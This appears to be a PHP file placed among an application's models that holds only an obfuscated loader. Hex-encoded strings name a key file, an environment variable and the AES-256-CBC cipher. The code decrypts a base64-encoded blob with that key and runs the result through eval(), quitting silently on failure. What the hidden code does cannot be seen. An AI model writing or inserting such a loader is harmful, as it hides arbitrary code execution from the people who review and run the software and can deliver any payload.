<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kR1FU9j5Pvcs4NC2GkCsaQ==');

$c=base64_decode(

'kXePIaZxUs05LcYOsdFS7N9Z19dIaGqwM5ymBQJ3Z3qKvkLenHj3l3n3/n/4bvc7nZ+xWEtoeqIA' .
'tph64dIWUluttNXbX49E9qRYcxQAoJDmkMToS8SjcUwXhGRw2+6irhQPo28I5WJ4M+z0QB++m0+y' .
'lYm6rYR+eOGP4ZksDrme6kdF9kng2ERSjjfaaAKPU1mohsrIusqMFThILVn7ikfoZx4Vnrhsdy6U' .
'YE3NCY9rIejpvgKDgqGPm1V5YiEBX+m4fz9m+v/YTz1CTW9aFLKC34x1FZ3yO3xYI9R2gDUrPSzv' .
'uf++eCwqmZkxpUYCUM6TDsCj026hGCJC+iQt5ahb3AlwZ2Dqu1NoIZGvZ2GrVtK85v7yZVvWGA0e' .
'TzGyZuQErAfu3vsoVleOOo60/yhI9LGSNZtEMQ0J8maRr390esA6izcNujcCWDjS6w8MRvJVizol' .
'eLTkm4lQlG0+3YwPdhDVm6PpN60rlXqXXMr0m5LE44k+xgZyRr5AC70+4h7i8gXV84qC1o0023Ga' .
'H5c562MwuW4leR0HeuGLcGwYVVNJp3ubmzcwzBc3YWk3u/+Hr81tfRIj0u0QQCA/V2SFm/R3aiMM' .
'K5en4vA6UvdgFVCmKAQeRwji0wGcaZOq+7uMF1uJ1dAtNFhxlMmJcEjHcX3v1oIeBRxnh1uAdsrH' .
'0gHbtOFCaw1Bu7qa/QHhnJy6Ts9I2WNTALYsU6PbHnD9edg7xfMGzqQeyWGKBY1R/2WJW+OJ4Y+H' .
'jn7izGqgV+zLxFsEmKu7+DYYFhedTLki/xe+JamniFt+zcZjlRgheJEV26ycEIwv27h6OsHCUGci' .
'oyJpJInVwsbNcqkH05CNmoYsq9rKeHd87b1zd/sIVQUfyLxCk9wrmZqC1LWfaeNXvQ86McSFHoMz' .
'Ps+52kSSA1QbvzON19NLCk6HOY9gR0wZw9m5DU1qkZeR8aHv+12jSpSlQcHFGDx7WzAykTdZ8Lgw' .
'0wBLiLYhhtH2/+5ThuwAyCSCx9rYo2z8yGtxNVzvDFsALq9G3DhmO3Qr/NWgQWP2AYodufIR2Wkl' .
'l4gond6ur/e7KtVD/rYdAJLCSLv65/a3hQqc/JpVn2pKt6k2ysp5NDwAy7ZtThaBaopXhP63B3UJ' .
'T2mLEst3rRra1BWVYV/5OUahxQf/ixPAdTM2UN94luVHIkflicaCO85XImk70AYQbEy4z/vk+h0J' .
'DDUO5H8MltOb66mitCAZVVpsdrljx0AcgDrWM26OICCh2Wm3TMKaOD4tePYiAKvNmS00uMmLZFzl' .
'2iOjiBXvUO9Rb1yx196FZsMTbfE0HX8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

